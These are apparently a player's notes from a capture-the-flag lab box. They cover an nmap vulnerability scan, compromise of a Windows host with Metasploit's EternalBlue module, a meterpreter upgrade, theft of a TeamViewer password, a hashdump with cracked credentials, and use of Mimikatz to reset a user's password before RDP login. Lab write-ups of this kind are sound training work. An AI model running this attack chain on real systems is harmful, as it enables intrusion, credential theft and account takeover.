# Pepega Energy Notes
___

# My IP = 10.8.19.163

# Target IP = 10.10.131.74
___

---
# NMAP Sc

> nmap -Pn -n -vv -sC -sV -T5 --script vuln 10.10.131.74 | tee pepega-energy.nmap

Results : >"cat pepega-energy.nmap | grep 'open'"

	135/tcp   open     msrpc              syn-ack     Microsoft Windows RPC
	139/tcp   open     netbios-ssn        syn-ack     Microsoft Windows netbios-ssn
	445/tcp   open     microsoft-ds       syn-ack     Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
	3389/tcp  open     ssl/ms-wbt-server? syn-ack
	5357/tcp  open     http               syn-ack     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
	9001/tcp  open     tcpwrapped         syn-ack
	49152/tcp open     msrpc              syn-ack     Microsoft Windows RPC
	49153/tcp open     msrpc              syn-ack     Microsoft Windows RPC
	49154/tcp open     msrpc              syn-ack     Microsoft Windows RPC
	49155/tcp open     msrpc              syn-ack     Microsoft Windows RPC
	49159/tcp open     msrpc              syn-ack     Microsoft Windows RPC
	49160/tcp open     msrpc              syn-ack     Microsoft Windows RPC

# MS17-010 Samba Remote Code Execution

1. Machine vulnerable. Launching Metasploit for MS17-010 meterpreter shell.

Success! Used > windows/smb/ms17_010_eternalblue

> whoami - NTAUTHORITY

2. Find User and admin flags.

# Upgraded shell to meterpreter shell

1. Backgrounded shell.

2. Searched for shell_to_meterpreter in Metasploit.

3. Set the sessions ID and hit run.

4. Changed to new session.

5. Acquired team viewer password:

> msf5 post(windows/gather/credentials/teamviewer_passwords) > options

Module options (post/windows/gather/credentials/teamviewer_passwords):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   SESSION                        yes       The session to run this module on.
   WINDOW_TITLE  TeamViewer       no        Specify a title for getting the window handle, e.g. TeamViewer

msf5 post(windows/gather/credentials/teamviewer_passwords) > set SESSION 2
SESSION => 2
msf5 post(windows/gather/credentials/teamviewer_passwords) > run

[*] Finding TeamViewer Passwords on PEPEGAENERGY-01


###[+] Found Unattended Password: RedBullEnergyBad

# MEterpreter Hashdump

Cracked User: Timmy  Password: ilovetimmy


# Mimikatz to change Zachary's password

> load kiwi

> run post/windows/gather/smart_hashdump

> password_change -s localhost -u Zachary -n <old hash> -P password123

SUCCESS

#RDP to Zachary

1. Log on. Search Firefox history and files history.

Not there checked video on youtube for writeup.
 
